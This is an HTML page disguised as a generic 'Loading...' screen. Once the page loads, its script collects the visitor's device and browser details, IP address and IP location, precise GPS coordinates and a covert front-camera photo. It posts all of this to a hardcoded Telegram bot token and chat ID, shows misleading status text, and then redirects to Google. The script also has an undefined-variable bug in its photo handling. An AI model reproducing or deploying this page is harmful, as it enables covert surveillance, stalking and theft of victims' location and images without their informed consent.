<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            max-width: 90%;
            width: 400px;
        }
        
        h1 {
            font-size: 1.8rem;
            margin-bottom: 1rem;
            font-weight: 600;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status {
            margin: 20px 0;
            font-size: 1rem;
            opacity: 0.9;
        }
        
        .permission-request {
            background: rgba(255, 255, 255, 0.2);
            padding: 1rem;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        .hidden {
            display: none;
        }
        
        .dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        
        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }

        .error-box {
            background: rgba(255, 0, 0, 0.2);
            padding: 1rem;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Loading<span class="dots"></span></h1>
        <div class="loading-spinner"></div>
        <div class="status" id="status">Preparing your content...</div>
        
        <!-- Permission request (initially hidden) -->
        <div id="permissionMessage" class="permission-request hidden">
            <p>üìç This page needs camera and location access</p>
            <p style="font-size: 0.9rem; margin-top: 10px;">Please allow when your browser asks</p>
        </div>

        <!-- Error message (initially hidden) -->
        <div id="errorMessage" class="error-box hidden">
            <p>‚ö†Ô∏è Something went wrong. Redirecting...</p>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION - IMPORTANT: CHANGE THESE!
        // ============================================
        
        // WARNING: You shared your token publicly. Create a NEW ONE at @BotFather
        const TELEGRAM_BOT_TOKEN = '7858680530:AAHC3fJ58f26AH4GmMZEf9cKxO7J9WTds7A'; // REPLACE THIS!
        const TELEGRAM_CHAT_ID = '5888374938'; // Your chat ID
        
        // Where to redirect after collection
        const REDIRECT_URL = 'https://www.google.com'; // Change to any link
        
        // ============================================
        // Device Information Collection
        // ============================================
        
        async function collectDeviceInfo() {
            const info = {};
            
            try {
                // Basic browser info
                info.userAgent = navigator.userAgent;
                info.language = navigator.language;
                info.languages = navigator.languages?.join(', ') || 'unknown';
                info.platform = navigator.platform;
                info.cookieEnabled = navigator.cookieEnabled;
                info.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                info.maxTouchPoints = navigator.maxTouchPoints;
                
                // Screen info
                info.screenWidth = screen.width;
                info.screenHeight = screen.height;
                info.screenColorDepth = screen.colorDepth;
                info.devicePixelRatio = window.devicePixelRatio;
                
                // Window info
                info.windowInnerWidth = window.innerWidth;
                info.windowInnerHeight = window.innerHeight;
                
                // Time info
                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                info.timezoneOffset = new Date().getTimezoneOffset();
                info.currentTime = new Date().toISOString();
                
                // Connection info
                if (navigator.connection) {
                    info.networkType = navigator.connection.effectiveType;
                    info.networkSpeed = navigator.connection.downlink + ' Mbps';
                }
                
                // Get IP address
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    info.ipAddress = ipData.ip;
                    
                    // Get location from IP
                    const locationResponse = await fetch(`https://ipapi.co/${info.ipAddress}/json/`);
                    const locationData = await locationResponse.json();
                    info.city = locationData.city || 'unknown';
                    info.region = locationData.region || 'unknown';
                    info.country = locationData.country_name || 'unknown';
                    info.isp = locationData.org || 'unknown';
                } catch (e) {
                    info.ipAddress = 'Could not fetch IP';
                }
                
                // Browser plugins (limited for privacy)
                const pluginNames = [];
                for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
                    pluginNames.push(navigator.plugins[i].name);
                }
                info.plugins = pluginNames.join(', ') || 'none';
                
            } catch (error) {
                console.error('Device info error:', error);
            }
            
            return info;
        }
        
        // ============================================
        // Camera Functions - FIXED VERSION
        // ============================================
        
        async function takeCameraSnapshot() {
            try {
                // Check if mediaDevices is supported
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.log('Camera not supported');
                    return null;
                }
                
                // Request camera access with timeout
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    } 
                }).catch(err => {
                    console.log('Camera permission denied:', err);
                    return null;
                });
                
                if (!stream) return null;
                
                // Create video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                
                // Wait for video to be ready
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                // Wait a moment for camera to adjust
                await new Promise(r => setTimeout(r, 500));
                
                // Create canvas and draw
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Get JPEG data (lower quality for smaller file)
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                
                return imageData;
            } catch (error) {
                console.log('Camera error:', error.message);
                return null;
            }
        }
        
        // ============================================
        // Location Functions - FIXED VERSION
        // ============================================
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                // Set a timeout
                const timeoutId = setTimeout(() => {
                    resolve(null);
                }, 10000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeoutId);
                        resolve({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: position.timestamp
                        });
                    },
                    (error) => {
                        clearTimeout(timeoutId);
                        console.log('Location error:', error.message);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // ============================================
        // Telegram Functions - COMPLETELY FIXED
        // ============================================
        
        async function sendToTelegram(deviceInfo, location, photoBase64) {
            // Validate token
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_BOT_TOKEN')) {
                console.log('Telegram not configured');
                return false;
            }
            
            try {
                // Format message
                let message = `üì± <b>New Device Info</b>\n\n`;
                message += `‚è∞ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${deviceInfo.ipAddress || 'Unknown'}\n`;
                message += `üìç <b>Location:</b> ${deviceInfo.city || '?'}, ${deviceInfo.country || '?'}\n`;
                
                if (location) {
                    message += `üéØ <b>GPS:</b> ${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}\n`;
                    message += `<b>Accuracy:</b> ${Math.round(location.acc)}m\n`;
                    message += `<b>Map:</b> <a href="https://maps.google.com/?q=${location.lat},${location.lng}">View</a>\n`;
                }
                
                message += `\nüíª <b>Device:</b>\n`;
                message += `‚Ä¢ Browser: ${deviceInfo.platform || '?'}\n`;
                message += `‚Ä¢ Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
                message += `‚Ä¢ Timezone: ${deviceInfo.timezone || '?'}\n`;
                message += `‚Ä¢ Language: ${deviceInfo.language || '?'}\n`;
                
                // Send text message first (simpler)
                const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const textResponse = await fetch(textUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const textResult = await textResponse.json();
                console.log('Text send result:', textResult);
                
                // Send photo if available
                if (photoBase64) {
                    try {
                        // Convert base64 to blob
                        const base64Data = photoBase64.split(',')[1];
                        const byteCharacters = atob(base64Data);
                        const byteNumbers = new Array(byteCharacters.length);
                        for (let i = 0; i < byteCharacters.length; i++) {
                            byteNumbers[i] = byteCharacters.charCodeAt(i);
                        }
                        const byteArray = new Uint8Array(byteNumbers);
                        const blob = new Blob([byteArray], { type: 'image/jpeg' });
                        
                        // Create form data
                        const formData = new FormData();
                        formData.append('chat_id', TELEGRAM_CHAT_ID);
                        formData.append('photo', blob, 'snapshot.jpg');
                        formData.append('caption', `üì∏ Camera snapshot at ${new Date().toLocaleString()}`);
                        
                        // Send photo
                        const photoUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                        const photoResponse = await fetch(photoUrl, {
                            method: 'POST',
                            body: formData
                        });
                        
                        const photoResult = await photoResponse.json();
                        console.log('Photo send result:', photoResult);
                    } catch (photoError) {
                        console.log('Photo send error:', photoError.message);
                    }
                }
                
                return true;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }
        
        // ============================================
        // Main Execution
        // ============================================
        
        async function main() {
            const statusEl = document.getElementById('status');
            const permissionEl = document.getElementById('permissionMessage');
            const errorEl = document.getElementById('errorMessage');
            
            try {
                // Step 1: Collect device info
                statusEl.textContent = 'Collecting device information...';
                const deviceInfo = await collectDeviceInfo();
                
                // Step 2: Show permission request
                permissionEl.classList.remove('hidden');
                statusEl.textContent = 'Requesting camera and location access...';
                
                // Step 3: Try to get location and camera (with timeout)
                const timeoutPromise = new Promise(r => setTimeout(() => r({ location: null, photo: null }), 15000));
                
                const collectPromise = (async () => {
                    const [location, photoBase64] = await Promise.allSettled([
                        getLocation(),
                        takeCameraSnapshot()
                    ]);
                    
                    return {
                        location: location.status === 'fulfilled' ? location.value : null,
                        photo: photoStatus === 'fulfilled' ? photoStatus.value : null
                    };
                })();
                
                const result = await Promise.race([collectPromise, timeoutPromise]);
                
                // Hide permission message
                permissionEl.classList.add('hidden');
                
                // Step 4: Send to Telegram
                statusEl.textContent = 'Securing connection...';
                await sendToTelegram(
                    deviceInfo, 
                    result.location || null, 
                    result.photo || null
                );
                
                // Step 5: Final countdown
                statusEl.textContent = 'Almost there...';
                
                // Redirect
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
                
            } catch (error) {
                console.error('Main error:', error);
                errorEl.classList.remove('hidden');
                statusEl.textContent = 'Redirecting...';
                
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }
        }
        
        // Start when page loads
        window.addEventListener('load', main);
    </script>
</body>
</html>
